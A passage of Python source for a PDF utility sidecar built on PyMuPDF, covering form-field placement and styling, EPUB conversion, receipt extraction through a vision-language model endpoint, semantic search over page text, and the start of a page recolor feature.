        # A tight glyph bbox is not a line box, and the marker is frequently set tiny so it
        # fits a narrow column — without a floor the field ends up ~8pt tall and `font_size: 0`
        # (auto-fit) then renders text far too small to read. 14pt fits ~10pt text.
        h = max(ah + 2.0, 14.0) if h in (None, "auto") else float(h)

    align = str(spec.get("align") or "left")
    x0 = anchor.x0
    if align == "right":
        x0 = anchor.x1 - w
    elif align == "center":
        x0 = anchor.x0 + (aw - w) / 2.0

    # VERTICAL: centre in the CELL when there is one — never on the marker. The marker is a
    # few points of text sitting on the line's baseline, so its box is near the BOTTOM of the
    # row (more so the smaller you set it, and in a tight column you set it very small). A
    # field aligned to the marker therefore hangs down out of its row. The cell is what the
    # author drew; centre in it. Outside a table, grow symmetrically around the marker.
    if cell is not None:
        y0 = cell.y0 + (cell.height - h) / 2.0
    else:
        y0 = anchor.y0 - (h - ah) / 2.0
    x0 += float(spec.get("offset_x", 0) or 0)
    y0 += float(spec.get("offset_y", 0) or 0)
    rect = fitz.Rect(x0, y0, x0 + w, y0 + h)

    warn = None
    if not rect in page_rect:  # noqa: E713 — fitz.Rect implements __contains__
        warn = ("field runs off the page (%s vs page %s) — reduce width or move the tag left"
                % ([round(v) for v in rect], [round(v) for v in page_rect]))
    return rect, warn


def _overlaps(created, page_no):
    """Warn when two fields on a page sit on top of each other — usually a width that ate the
    next field. Reported, not fatal: overlapping fields are legal, just rarely intended.

    The threshold is RELATIVE (a fifth of the smaller field) because neighbouring fields in a
    tight table routinely touch by a fraction of a point: a 78pt-wide field kissing its
    neighbour by 0.5pt is 39 sq pt of "overlap" and means nothing. Absolute area would cry
    wolf on every dense grid and train people to ignore the warning.
    """
    import fitz

    out = []
    here = [c for c in created if c["page"] == page_no]
    for i in range(len(here)):
        for j in range(i + 1, len(here)):
            a, b = fitz.Rect(here[i]["rect"]), fitz.Rect(here[j]["rect"])
            shared = (a & b).get_area()
            if shared > 0.2 * min(a.get_area(), b.get_area()):
                out.append((here[i]["key"], here[j]["key"]))
    return out


def _color(v):
    """#RRGGBB (or [r,g,b] 0-1) -> the (r,g,b) float tuple PyMuPDF wants."""
    if v is None or v is False:
        return None
    if isinstance(v, (list, tuple)) and len(v) == 3:
        return tuple(float(x) for x in v)
    s = str(v).strip().lstrip("#")
    if len(s) == 6:
        return tuple(int(s[i:i + 2], 16) / 255.0 for i in (0, 2, 4))
    return None


# PyMuPDF silently coerces ANY unknown font name to Helv, so a user asking for Arial would
# quietly get Helvetica. The validator rejects anything outside this set rather than lie.
FORM_FONTS = ("Helv", "TiRo", "Cour", "ZaDb")

# A field with no border and no fill is INVISIBLE — the reader can't see where to type, which
# makes the zero-config path useless. Default to a light border + tint (what every form tool
# draws); `style: { border: false, fill: false }` turns them off.
DEFAULT_STYLE = {"border": "#7a8699", "fill": "#eef4fb", "border_width": 0.75, "font_size": 9}

# Field flags (PDF 32000-1 table 226/228).
FF_READONLY = 1 << 0
FF_REQUIRED = 1 << 1
FF_MULTILINE = 1 << 12
FF_PASSWORD = 1 << 13
FF_COMB = 1 << 24
FF_EDIT = 1 << 18
FF_MULTISELECT = 1 << 21


def _add_form_widget(page, spec, rect, style):
    """Create one real AcroForm widget. The tag key becomes the PDF field name verbatim —
    that's what lets `fill_form: { fields: { employee_name: ... } }` work with no form pack."""
    import fitz

    typ = spec.get("type", "text")
    w = fitz.Widget()
    w.rect = rect
    w.field_name = spec["key"]
    w.field_label = str(spec.get("tooltip") or spec.get("label") or spec["key"])

    flags = 0
    if spec.get("required"):
        flags |= FF_REQUIRED
    if spec.get("readonly"):
        flags |= FF_READONLY

    if typ == "checkbox":
        w.field_type = fitz.PDF_WIDGET_TYPE_CHECKBOX
    elif typ == "signature":
        w.field_type = fitz.PDF_WIDGET_TYPE_SIGNATURE
    elif typ in ("dropdown", "combobox"):
        w.field_type = fitz.PDF_WIDGET_TYPE_COMBOBOX
        w.choice_values = list(spec.get("choices") or [])
        if spec.get("editable"):
            flags |= FF_EDIT
    elif typ == "listbox":
        w.field_type = fitz.PDF_WIDGET_TYPE_LISTBOX
        w.choice_values = list(spec.get("choices") or [])
        if spec.get("multiselect"):
            flags |= FF_MULTISELECT
    else:  # text / date / number / money / phone / ssn / zip
        w.field_type = fitz.PDF_WIDGET_TYPE_TEXT
        if spec.get("multiline"):
            flags |= FF_MULTILINE
        if spec.get("password"):
            flags |= FF_PASSWORD

        hint = None
        if typ in FIELD_FORMATS:
            hint, ml_default = FIELD_FORMATS[typ]
            if typ == "date":
                hint = str(spec.get("format") or hint)  # `format` is the hint, not a picture
            if ml_default and not spec.get("maxlen"):
                spec = dict(spec, maxlen=ml_default)
        # The tooltip is the portable half of a typed field: the script only fires in Acrobat,
        # but every viewer shows /TU on hover. Never leave the expectation implicit.
        if hint and hint.lower() not in (w.field_label or "").lower():
            w.field_label = "%s (%s)" % (w.field_label, hint)

        ml = int(spec.get("maxlen") or 0)
        if ml:
            w.text_maxlen = ml
            if spec.get("comb"):
                flags |= FF_COMB
        if spec.get("default"):
            w.field_value = str(spec["default"])

    w.field_flags = flags
    if typ not in ("checkbox", "signature"):
        w.text_font = str(style.get("font") or "Helv")
        w.text_fontsize = float(style.get("font_size", 0) or 0)  # 0 = auto-fit
        tc = _color(style.get("text_color"))
        if tc:
            w.text_color = tc
    bc = _color(style.get("border"))
    if bc:
        w.border_color = bc
        w.border_width = float(style.get("border_width", 0.75) or 0.75)
    fc = _color(style.get("fill"))
    if fc:
        w.fill_color = fc
    page.add_widget(w)


def _write_debug_overlay(doc, created, art_dir):
    """A copy with every field's rect outlined + labelled. The author writes [[x]] (~90pt of
    ink) and gets whatever width: says, so 'where did the fields actually land?' needs an
    answer you can look at."""
    import fitz

    dbg = fitz.open("pdf", doc.tobytes())
    for rec in created:
        page = dbg.load_page(rec["page"] - 1)
        r = fitz.Rect(rec["rect"])
        page.draw_rect(r, color=(0.85, 0.1, 0.1), width=0.8)
        page.insert_text((r.x0, max(r.y0 - 2, 8)), "%s (%s)" % (rec["key"], rec["type"]),
                         fontsize=5.5, color=(0.85, 0.1, 0.1))
    dbg.save(os.path.join(art_dir, "form-debug.pdf"), garbage=3, deflate=True)
    dbg.close()


def _normalize_checkmarks(doc):
    """PyMuPDF's widget.update() redraws a ticked box with its own glyph — ZapfDingbats
    "3" (a star/asterisk) — overriding the glyph the form was designed with ("4" = a check
    mark). Rewrite every ticked box's on-appearance back to "4" so all checkboxes look the
    same (and match the original form)."""
    import re
    for pno in range(doc.page_count):
        for w in (doc.load_page(pno).widgets() or []):
            if w.field_type_string not in ("CheckBox", "RadioButton"):
                continue
            v = w.field_value
            if v in (None, "", "Off"):
                continue
            try:
                apn = doc.xref_get_key(w.xref, "AP/N/" + str(v))
            except Exception:
                continue
            if apn and apn[0] == "xref":
                nref = int(apn[1].split()[0])
                s = doc.xref_stream(nref)
                if s and b"/ZaDb" in s:
                    s2 = re.sub(rb"(/ZaDb\s+[\d.]+\s+Tf.*?)\(.\)(\s*Tj)", rb"\g<1>(4)\g<2>", s, flags=re.S)
                    if s2 and s2 != s:
                        try:
                            doc.update_stream(nref, s2)
                        except Exception:
                            pass


def _finalize_acroform(doc):
    """After filling, make the form render the SAME in every viewer. PyMuPDF's
    widget.update() already wrote correct appearance streams, so we (a) turn OFF
    NeedAppearances — otherwise viewers regenerate appearances themselves, and many
    government forms corrupt that (e.g. spaces become "&") — and (b) drop the XFA
    layer, since Adobe would otherwise prefer the XFA data over the AcroForm. Returns
    True if an XFA layer was present and dropped: such forms still render their
    INTERACTIVE fields via the viewer's own XFA engine (which can show "&" for spaces),
    so `flatten: true` is recommended for a copy that looks right everywhere."""
    xfa_dropped = False
    try:
        doc.need_appearances(False)
    except Exception:
        pass
    try:
        af = doc.xref_get_key(doc.pdf_catalog(), "AcroForm")
        if af and af[0] == "xref":
            xref = int(af[1].split()[0])
            if doc.xref_get_key(xref, "XFA")[0] not in ("null", "unknown"):
                doc.xref_set_key(xref, "XFA", "null")
                xfa_dropped = True
    except Exception:
        pass
    return xfa_dropped


# --- PDF -> EPUB (reflowable ebook for Kindle etc.) ------------------------------

def _build_epub_pymupdf(doc, out_path, title, author, chapter_pages=10):
    """Build a reflowable EPUB 3 from the PDF's text, with no external tools. Uses the
    PDF outline for chapters when present, else fixed page groups. Text-focused (best
    for prose ebooks); returns the chapter count."""
    import zipfile
    import uuid as _uuid
    import html as _html

    def esc(s):
        return _html.escape(s or "")

    toc = []
    try:
        toc = doc.get_toc() or []
    except Exception:
        toc = []
    chapters = []  # (title, [0-based page indices])
    starts = [(t[1], t[2] - 1) for t in toc if t[0] == 1 and 0 <= t[2] - 1 < doc.page_count]
    starts.sort(key=lambda s: s[1])
    if starts:
        for i, (ctitle, sp) in enumerate(starts):
            ep = starts[i + 1][1] if i + 1 < len(starts) else doc.page_count
            chapters.append((ctitle or ("Chapter %d" % (i + 1)), list(range(sp, ep))))
    if not chapters:
        n = max(1, int(chapter_pages))
        for i in range(0, doc.page_count, n):
            pages = list(range(i, min(i + n, doc.page_count)))
            chapters.append(("Pages %d–%d" % (pages[0] + 1, pages[-1] + 1), pages))

    def page_html(pno):
        page = doc.load_page(pno)
        out = []
        for b in sorted(page.get_text("blocks"), key=lambda b: (round(b[1]), round(b[0]))):
            if len(b) >= 5 and (len(b) < 7 or b[6] == 0):
                t = (b[4] or "").strip()
                if t:
                    out.append("<p>%s</p>" % esc(t).replace("\n", "<br/>"))
        return "\n".join(out)

    XHTML = ('<?xml version="1.0" encoding="utf-8"?>\n<!DOCTYPE html>\n'
             '<html xmlns="http://www.w3.org/1999/xhtml"><head><meta charset="utf-8"/>'
             '<title>%s</title></head><body>\n%s\n</body></html>')
    items = []
    for idx, (ctitle, pages) in enumerate(chapters):
        body = "<h2>%s</h2>\n%s" % (esc(ctitle), "\n".join(page_html(p) for p in pages))
        items.append(("chap%03d.xhtml" % idx, ctitle, XHTML % (esc(ctitle), body)))

    uid = "urn:uuid:" + str(_uuid.uuid4())
    manifest = "\n".join('<item id="c%d" href="%s" media-type="application/xhtml+xml"/>' % (i, it[0]) for i, it in enumerate(items))
    spine = "\n".join('<itemref idref="c%d"/>' % i for i in range(len(items)))
    opf = ('<?xml version="1.0" encoding="utf-8"?>\n'
           '<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="bookid">'
           '<metadata xmlns:dc="http://purl.org/dc/elements/1.1/">'
           '<dc:identifier id="bookid">%s</dc:identifier><dc:title>%s</dc:title>'
           '<dc:language>en</dc:language><dc:creator>%s</dc:creator></metadata>'
           '<manifest><item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>\n%s\n</manifest>'
           '<spine>\n%s\n</spine></package>') % (uid, esc(title), esc(author), manifest, spine)
    navlist = "\n".join('<li><a href="%s">%s</a></li>' % (it[0], esc(it[1])) for it in items)
    nav = ('<?xml version="1.0" encoding="utf-8"?>\n<!DOCTYPE html>\n'
           '<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">'
           '<head><meta charset="utf-8"/><title>%s</title></head><body>'
           '<nav epub:type="toc"><h1>Contents</h1><ol>\n%s\n</ol></nav></body></html>') % (esc(title), navlist)
    container = ('<?xml version="1.0"?>\n<container version="1.0" '
                 'xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles>'
                 '<rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>'
                 '</rootfiles></container>')
    with zipfile.ZipFile(out_path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("mimetype", "application/epub+zip", compress_type=zipfile.ZIP_STORED)
        z.writestr("META-INF/container.xml", container)
        z.writestr("OEBPS/content.opf", opf)
        z.writestr("OEBPS/nav.xhtml", nav)
        for it in items:
            z.writestr("OEBPS/" + it[0], it[2])
    return len(items)


# --- receipt/invoice extraction via a vision-language model (P3-1) ------------------
# `extract_receipt` rasterizes each page to an image and asks an OpenAI-compatible
# VISION endpoint (vLLM serving Qwen3-VL in production; Ollama or a stub on CPU for a
# local smoke test) to return STRICT JSON of the receipt's fields. The heavy model
# never runs in this venv — the sidecar only rasterizes (PyMuPDF) and POSTs (stdlib
# urllib), so the torch/vLLM stack can't collide with the PyMuPDF/ocrmypdf pins.
_RECEIPT_FIELDS = ["merchant", "merchant_address", "date", "time", "currency",
                   "subtotal", "tax", "tip", "total", "payment_method", "receipt_number"]
_INVOICE_EXTRA = ["invoice_number", "po_number", "bill_to", "terms", "due_date"]


def _receipt_prompt(schema, want_line_items, currency_hint):
    """Return (system, user) prompts instructing the VLM to emit strict receipt JSON."""
    keys = list(_RECEIPT_FIELDS) + (_INVOICE_EXTRA if schema == "invoice" else [])
    if want_line_items:
        keys = keys + ["line_items (array of {description, qty, unit_price, amount})"]
    system = ("You extract structured data from a photographed or scanned %s. Read every "
              "value directly from the image. Return ONLY a single JSON object — no prose, "
              "no markdown fences. Use null for any field not present. Dates as YYYY-MM-DD, "
              "times as HH:MM (24h). Money as plain numbers (no symbols, dot decimal)." % schema)
    hint = (" Assume the currency is %s if it is not printed." % currency_hint) if currency_hint else ""
    user = "Extract this %s into a JSON object with these keys: %s.%s" % (schema, ", ".join(keys), hint)
    return system, user


def _vlm_chat(endpoint, model, png_bytes, system, user, timeout=300):
    """POST one page image to an OpenAI-compatible vision chat endpoint and return the
    assistant text. `endpoint` is the base URL ending in /v1. Stdlib urllib only."""
    import urllib.request
    import urllib.error
    import base64
    import json as _vj
    base = (endpoint or "").rstrip("/")
    if not base.startswith("http"):
        base = "http://" + base
    url = base + "/chat/completions"
    b64 = base64.b64encode(png_bytes).decode("ascii")
    body = {
        "model": model, "temperature": 0, "max_tokens": 1500,
        "messages": [
            {"role": "system", "content": system},
            {"role": "user", "content": [
                {"type": "text", "text": user},
                {"type": "image_url", "image_url": {"url": "data:image/png;base64," + b64}},
            ]},
        ],
    }
    headers = {"content-type": "application/json"}
    # Bearer auth for hosted providers (e.g. NVIDIA NIM at integrate.api.nvidia.com/v1).
    # $PDFSTUDIO_VLM_API_KEY overrides; $NVIDIA_API_KEY is the shared fallback. Keyless
    # (Ollama / local vLLM) when neither is set.
    api_key = os.environ.get("PDFSTUDIO_VLM_API_KEY") or os.environ.get("NVIDIA_API_KEY")
    if api_key:
        headers["Authorization"] = "Bearer " + api_key
    req = urllib.request.Request(url, data=_vj.dumps(body).encode("utf-8"), headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            data = _vj.loads(r.read())
    except urllib.error.HTTPError as e:
        raise RuntimeError("VLM endpoint error %s at %s: %s (is model %r served?)"
                           % (e.code, url, e.read().decode("utf-8", "replace")[:200], model))
    except urllib.error.URLError as e:
        raise RuntimeError("VLM endpoint not reachable at %s (%s) — start the model server "
                           "(`vllm serve …` / `ollama serve`) or set $PDFSTUDIO_VLM_ENDPOINT." % (url, getattr(e, "reason", e)))
    return ((data.get("choices") or [{}])[0].get("message") or {}).get("content", "")


def _parse_json_object(text):
    """Best-effort parse of a JSON object from a model reply: strip ```json fences, else
    grab the outermost {...}. Returns a dict, or {} when nothing parses."""
    if not text:
        return {}
    s = text.strip()
    m = re.search(r"```(?:json)?\s*(.*?)```", s, re.S)
    if m:
        s = m.group(1).strip()
    try:
        v = json.loads(s)
        return v if isinstance(v, dict) else {}
    except Exception:  # noqa: BLE001 — fall through to a substring scan
        pass
    m = re.search(r"\{.*\}", s, re.S)
    if m:
        try:
            v = json.loads(m.group(0))
            return v if isinstance(v, dict) else {}
        except Exception:  # noqa: BLE001
            return {}
    return {}


def _receipt_rows(records, want_line_items):
    """Flatten receipt records into CSV (columns, rows) — one row per line item with the
    receipt-level fields repeated, or one row per receipt when there are no line items."""
    base_cols = ["file", "page", "merchant", "date", "time", "currency",
                 "subtotal", "tax", "tip", "total", "receipt_number"]
    item_cols = ["item_description", "item_qty", "item_unit_price", "item_amount"]
    cols = base_cols + (item_cols if want_line_items else [])
    rows = []
    for rec in records:
        f = rec.get("receipt") or {}
        def g(k):
            v = f.get(k)
            return "" if v is None else v
        base = {"file": rec.get("file", ""), "page": rec.get("page", ""),
                "merchant": g("merchant"), "date": g("date"), "time": g("time"),
                "currency": g("currency"), "subtotal": g("subtotal"), "tax": g("tax"),
                "tip": g("tip"), "total": g("total"), "receipt_number": g("receipt_number")}
        items = f.get("line_items") if want_line_items else None
        if want_line_items and isinstance(items, list) and items:
            for it in items:
                if not isinstance(it, dict):
                    continue
                row = dict(base)
                row["item_description"] = "" if it.get("description") is None else it.get("description")
                row["item_qty"] = "" if it.get("qty") is None else it.get("qty")
                row["item_unit_price"] = "" if it.get("unit_price") is None else it.get("unit_price")
                row["item_amount"] = "" if it.get("amount") is None else it.get("amount")
                rows.append(row)
        else:
            rows.append(dict(base))
    return cols, rows


# Runs in the SEPARATE PaddleOCR-VL interpreter ($PDFSTUDIO_PADDLE_PYTHON) — the PaddlePaddle
# stack is heavy/conflict-prone, so it never enters the PyMuPDF/marker venv. Reads a PDF, runs
# the 0.9B doc-parsing model, and writes concatenated Markdown to the output path.
_PADDLEOCR_VL_HELPER = r'''
import os, sys
src, out = sys.argv[1], sys.argv[2]
from paddleocr import PaddleOCRVL
pipe = PaddleOCRVL(device=os.environ.get("PDFSTUDIO_PADDLE_DEVICE", "cpu"))
pages = list(pipe.predict(src))
try:  # cross-page cleanup (table merge, heading relevel) — older builds may lack it
    pages = list(pipe.restructure_pages(pages, merge_tables=True, relevel_titles=True, concatenate_pages=True))
except Exception:
    pass
parts = []
for res in pages:
    md = getattr(res, "markdown", None)
    if isinstance(md, dict):
        md = md.get("markdown_texts") or md.get("markdown") or ""
    parts.append(md if isinstance(md, str) else ("" if md is None else str(md)))
with open(out, "w", encoding="utf-8") as f:
    f.write(("\n\n".join(p for p in parts if p).strip() + "\n"))
'''


def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--probe":
        try:
            import fitz  # noqa: F401
            print("ok")
            sys.exit(0)
        except Exception as e:  # noqa: BLE001
            print("no: %s" % e)
            sys.exit(1)

    try:
        req = json.loads(sys.stdin.read())
    except Exception as e:  # noqa: BLE001
        print(json.dumps({"ok": False, "error": "bad request: %s" % e}))
        return

    op = req.get("op")
    params = req.get("params") or {}
    in_pdf = req.get("in")
    out_pdf = req.get("out")
    art_dir = req.get("artifact_dir")
    input_files = req.get("inputs") or []  # multi-input creator ops (images_to_pdf)

    try:
        os.makedirs(art_dir, exist_ok=True)
    except Exception:  # noqa: BLE001
        pass

    # Creator ops build a PDF from a non-PDF source, so they must NOT open the
    # input as a PDF (and may have no PDF input at all). Everything else opens
    # the working document with PyMuPDF up front.
    doc = None
    damaged = False   # P2-8: structural-damage signal, snapshotted right after open
    if op not in CREATOR_OPS:
        try:
            import fitz
        except Exception as e:  # noqa: BLE001
            print(json.dumps({"ok": False, "error": "PyMuPDF not available: %s" % e}))
            return
        try:
            doc = fitz.open(in_pdf)
        except Exception as e:  # noqa: BLE001
            print(json.dumps({"ok": False, "error": "open failed: %s" % e}))
            return
        # P2-8: snapshot structural-damage signals IMMEDIATELY after open, before any page
        # walk pushes benign warnings into MuPDF's process-global buffer. Feature-detected
        # (no PyMuPDF version is pinned); best-effort — MuPDF often tolerates the qpdf-style
        # damaged /Length silently, so the ocr/pdf_to_pdfa exit-4 salvage also sets `damaged`.
        try:
            if getattr(doc, "is_repaired", False):
                damaged = True
            _mw = getattr(getattr(fitz, "TOOLS", None), "mupdf_warnings", None)
            if _mw and (_mw(reset=True) or "").strip():
                damaged = True
        except Exception:  # noqa: BLE001
            pass

    result = {"ok": True, "changed": False, "artifacts": []}
    try:
        if op == "extract_text":
            to = params.get("to") or "output/text.txt"
            pages = _page_texts(doc)
            # `clean: true` turns on all three cleanup passes; each can also be set
            # individually (an explicit value always wins over the `clean` shorthand).
            clean = bool(params.get("clean", False))
            hf = bool(params.get("remove_headers_footers", clean))
            hy = bool(params.get("fix_hyphenation", clean))
            rf = bool(params.get("reflow", clean))
            if hf or hy or rf:
                pages = _clean_pages(pages, hf, hy, rf)
            if bool(params.get("page_markers", False)):
                text = "\n\n".join("--- Page %d ---\n\n%s" % (p["page"], p["text"]) for p in pages if p["text"].strip())
            else:
                text = "\n\n".join(p["text"] for p in pages if p["text"].strip())
            with open(os.path.join(art_dir, "text.txt"), "w", encoding="utf-8") as f:
                f.write(text)
            result["artifacts"].append({"tmp": "text.txt", "path": to, "kind": "text"})
            applied = [n for n, on in (("headers/footers", hf), ("de-hyphenated", hy), ("reflowed", rf)) if on]
            result["note"] = "extracted %d chars%s" % (len(text), (" · cleaned: " + ", ".join(applied)) if applied else "")

        elif op == "semantic_search":
            query = str(params.get("query") or "").strip()
            if not query:
                result = {"ok": False, "error": "semantic_search requires a `query`"}
            else:
                to = params.get("to") or "output/search-results.md"
                top_k = max(1, int(params.get("top_k") or 5))
                model = params.get("model")
                pages = _clean_pages(_page_texts(doc), True, True, True)
                chunks = _chunk_pages(pages, int(params.get("chunk_words") or 200),
                                      int(params.get("overlap_words") or 30))
                if not chunks:
                    result = {"ok": False,
                              "error": "no extractable text — this looks like a scan; run `ocr` first"}
                else:
                    # Two ways to distinguish the query from the documents for retrieval:
                    # a HOSTED embedder (PDFSTUDIO_EMBED_ENDPOINT, e.g. NVIDIA nv-embed) takes an
                    # input_type ("query"/"passage") field; nomic-embed (Ollama) uses text prefixes.
                    hosted = bool(os.environ.get("PDFSTUDIO_EMBED_ENDPOINT"))
                    nomic = (not hosted) and "nomic" in str(model or os.environ.get("PDFSTUDIO_EMBED_MODEL") or "nomic-embed-text").lower()
                    docs = [("search_document: " + c["text"]) if nomic else c["text"] for c in chunks]
                    qtext = ("search_query: " + query) if nomic else query
                    # Cache the document embeddings: they don't depend on the query, so a
                    # second search on the same PDF only has to embed the query (instant).
                    # Keyed by the exact embedded strings + model; lives in the gitignored
                    # .pdf-cache/ under the workflow dir. `no_cache: true` bypasses it.
                    vecs, cache_hit = _embed_cached(docs, model, disabled=bool(params.get("no_cache")),
                                                    input_type=("passage" if hosted else None))
                    qv = _embed_texts([qtext], model, input_type=("query" if hosted else None))[0]
                    scored = sorted(
                        ({"page": c["page"], "text": c["text"], "score": _cosine(qv, v)}
                         for c, v in zip(chunks, vecs)),
                        key=lambda r: r["score"], reverse=True)
                    min_score = float(params.get("min_score") or 0)
                    hits = [h for h in scored if h["score"] >= min_score][:top_k]
                    lines = ["# Semantic search — %s" % query, "",
                             "_%d passage(s) from %d chunk(s) across %d page(s). Ranked by meaning, not keywords._"
                             % (len(hits), len(chunks), doc.page_count), ""]
                    for n, h in enumerate(hits, 1):
                        snippet = re.sub(r"\s+", " ", h["text"]).strip()
                        lines += ["## %d. Page %d · score %.3f" % (n, h["page"], h["score"]), "", snippet, ""]
                    if not hits:
                        lines += ["_No passage scored at or above min_score._", ""]
                    with open(os.path.join(art_dir, "search-results.md"), "w", encoding="utf-8") as f:
                        f.write("\n".join(lines))
                    result["artifacts"].append({"tmp": "search-results.md", "path": to, "kind": "text"})
                    best = (" · best p%d (%.3f)" % (hits[0]["page"], hits[0]["score"])) if hits else ""
                    cnote = " · embeddings cached" if cache_hit else ""
                    result["note"] = "searched %d chunk(s) → %d hit(s)%s%s" % (len(chunks), len(hits), best, cnote)

        elif op == "extract_receipt":
            import hashlib
            to = (params.get("to") or "output/receipts").rstrip("/")
            # _safe_rel confines the path but normpath's on Windows to backslashes; emitted
            # artifact paths are always POSIX-style (execute.ts writes them verbatim).
            to_rel = _safe_rel(to)
            if to_rel:
                to_rel = to_rel.replace("\\", "/")
            endpoint = params.get("endpoint") or os.environ.get("PDFSTUDIO_VLM_ENDPOINT")
            if not to_rel:
                result = {"ok": False, "error": "extract_receipt: `to` must be a project-relative path"}
            elif not endpoint:
                result = {"ok": False,
                          "error": "extract_receipt needs a vision-language endpoint — set the `endpoint` param "
                                   "(e.g. http://localhost:11434/v1) or the $PDFSTUDIO_VLM_ENDPOINT env var."}
            else:
                import fitz
                rschema = str(params.get("schema") or "receipt").lower()
                if rschema not in ("receipt", "invoice"):
                    rschema = "receipt"
                fmt = str(params.get("format") or "both").lower()
                want_json = fmt in ("both", "json")
                want_csv = fmt in ("both", "csv")
                want_items = params.get("line_items", True) is not False
                dpi = _clamp_dpi(params.get("dpi"), default=200)
                page_range = params.get("page_range") or ""
                currency_hint = str(params.get("currency_hint") or "").strip() or None
                resume = params.get("resume", True) is not False
                model = params.get("model") or os.environ.get("PDFSTUDIO_VLM_MODEL") or "qwen3-vl-8b"
                input_names = params.get("input_names") or []
                files = input_files or [in_pdf]
                n_files = len(files)

                # Prior ledger (resume): receipts.json is a flat list of per-page records, each
                # carrying its source file's sha256 — an unchanged file is reused wholesale, so no
                # VLM calls are spent on it. Lives in the workflow dir (the sidecar's cwd).
                prior = []
                if resume:
                    try:
                        with open(os.path.join(os.getcwd(), to_rel, "receipts.json"), "r", encoding="utf-8") as pf:
                            loaded = json.load(pf)
                        if isinstance(loaded, list):
                            prior = loaded
                    except Exception:  # noqa: BLE001 — first run / unreadable ledger → extract all
                        prior = []
                prior_by_file = {}
                for rec in prior:
                    prior_by_file.setdefault(rec.get("file", ""), []).append(rec)

                system, user = _receipt_prompt(rschema, want_items, currency_hint)
                records, skipped, failed, attempt = [], 0, 0, 0
                for fi, fpath in enumerate(files):
                    name = input_names[fi] if fi < len(input_names) else os.path.basename(fpath)
                    try:
                        with open(fpath, "rb") as fb:
                            sha = hashlib.sha256(fb.read()).hexdigest()[:16]
                    except Exception:  # noqa: BLE001
                        sha = ""
                    seen = prior_by_file.get(name)
                    if resume and seen and all(r.get("sha256") == sha and not r.get("error") for r in seen):
                        records.extend(seen)
                        skipped += 1
                    else:
                        try:
                            fdoc = fitz.open(fpath)
                        except Exception as e:  # noqa: BLE001
                            failed += 1
                            records.append({"file": name, "page": 1, "sha256": sha, "error": "open failed: %s" % e, "receipt": {}})
                            fdoc = None
                        if fdoc is not None:
                            for pno in sorted(_parse_page_range(page_range, fdoc.page_count)):
                                pix, _eff, _down = _safe_pixmap(fdoc.load_page(pno - 1), dpi,
                                                                max_pixels=OCR_MAX_PIXELS, max_dim=OCR_MAX_DIM)
                                png = pix.tobytes("png")
                                attempt += 1
                                try:
                                    fields = _parse_json_object(_vlm_chat(endpoint, model, png, system, user))
                                    if fields:
                                        records.append({"file": name, "page": pno, "sha256": sha, "receipt": fields})
                                    else:
                                        failed += 1
                                        records.append({"file": name, "page": pno, "sha256": sha,
                                                        "error": "model returned no parseable JSON", "receipt": {}})
                                except Exception as e:  # noqa: BLE001
                                    if attempt == 1:  # first call failed — a config/connectivity problem, fail fast
                                        fdoc.close()
                                        raise
                                    failed += 1
                                    records.append({"file": name, "page": pno, "sha256": sha, "error": str(e), "receipt": {}})
                            fdoc.close()
                    # forward per-file progress on stderr (stdout is reserved for the final JSON)
                    try:
                        sys.stderr.write(json.dumps({"progress": {"op": op, "chunk": fi + 1, "of": n_files}}) + "\n")
                        sys.stderr.flush()
                    except Exception:  # noqa: BLE001
                        pass

                records.sort(key=lambda r: (str(r.get("file", "")), int(r.get("page", 0) or 0)))

                if want_json:
                    by_file = {}
                    for rec in records:
                        by_file.setdefault(rec.get("file", ""), []).append(rec)
                    for name, recs in by_file.items():
                        stem = os.path.splitext(os.path.basename(name))[0] or "receipt"
                        payload = [{"page": r.get("page"),
                                    **({"error": r["error"]} if r.get("error") else {}),
                                    "receipt": r.get("receipt", {})} for r in recs]
                        tmp = "in_%s.json" % re.sub(r"[^A-Za-z0-9_.-]", "_", stem)
                        with open(os.path.join(art_dir, tmp), "w", encoding="utf-8") as jf:
                            json.dump({"file": name, "receipts": payload}, jf, indent=2)
                        result["artifacts"].append({"tmp": tmp, "path": "%s/%s.json" % (to_rel, stem), "kind": "json"})
                    with open(os.path.join(art_dir, "receipts.json"), "w", encoding="utf-8") as jf:
                        json.dump(records, jf, indent=2)
                    result["artifacts"].append({"tmp": "receipts.json", "path": "%s/receipts.json" % to_rel, "kind": "json"})

                if want_csv:
                    import csv as _csv
                    cols, rows = _receipt_rows([r for r in records if not r.get("error")], want_items)
                    with open(os.path.join(art_dir, "receipts.csv"), "w", encoding="utf-8", newline="") as cf:
                        w = _csv.DictWriter(cf, fieldnames=cols, extrasaction="ignore")
                        w.writeheader()
                        for row in rows:
                            # _csv_safe: these values came from a model reading a page IMAGE
                            # — never let one become a spreadsheet formula.
                            w.writerow({k: _csv_safe(row.get(k, "")) for k in cols})
                    result["artifacts"].append({"tmp": "receipts.csv", "path": "%s/receipts.csv" % to_rel, "kind": "csv"})

                ok_n = len([r for r in records if not r.get("error")])
                result["changed"] = False
                result["note"] = ("extracted %d receipt(s) from %d file(s) → %s/ · model %s%s%s"
                                  % (ok_n, n_files, to_rel, model,
                                     (" · %d file(s) unchanged" % skipped) if skipped else "",
                                     (" · %d failed" % failed) if failed else ""))

        elif op == "recolor":
            # dark  = smart dark mode: invert text/background to light-on-dark for comfortable
            #         reading, but keep embedded photos/logos looking normal (un-inverted).
            # invert = raw negative (everything, including images).
            # grayscale = drop color. All rasterize at `dpi` (text becomes an image).
            mode = str(params.get("mode") or "dark").lower()
            dpi = _clamp_dpi(params.get("dpi"))
            if mode not in ("dark", "invert", "grayscale", "gray"):
                result = {"ok": False, "error": 'recolor mode must be "dark", "invert", or "grayscale"'}
            else:
                out = fitz.open()
                protected = 0
                _ds = []
                for pno in range(doc.page_count):
                    page = doc.load_page(pno)
                    pix, eff, down = _safe_pixmap(page, dpi)   # P0-1: never crash on an oversized page
                    if down:
                        _ds.append((pno + 1, eff))
                    if mode in ("grayscale", "gray"):
                        pix = fitz.Pixmap(fitz.csGRAY, pix)
                        np = out.new_page(width=page.rect.width, height=page.rect.height)
                        np.insert_image(np.rect, pixmap=pix)
                    elif mode == "invert":
